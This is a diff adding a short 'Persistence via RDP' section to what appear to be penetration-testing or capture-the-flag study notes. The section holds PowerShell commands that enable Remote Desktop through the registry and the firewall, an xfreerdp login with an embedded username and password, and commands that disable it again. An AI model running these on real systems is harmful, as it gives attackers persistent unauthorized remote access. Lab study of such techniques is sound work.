@@ -83,6 +83,13 @@
 <p align="justify">Find file in Windows.</p>
 
 <img src="images/how_to_find_a_file_in_windows_terminal.png">
+
+<p>Persistence via RDP
+
+* enabling Remote Desktop via powershell: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
+* now we can connect to it from kali: `xfreerdp /u:s.schisholm /p:'FallOutBoy1!' /v:<target IP>`
+* to disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"` 
+</p>
   
 <p align="justify">I wanted to share this one too as at first I couldn't get the binary from the ftp server. First I have to use the command <code>binary</code> and then I can get it like I normally would.</p>
 
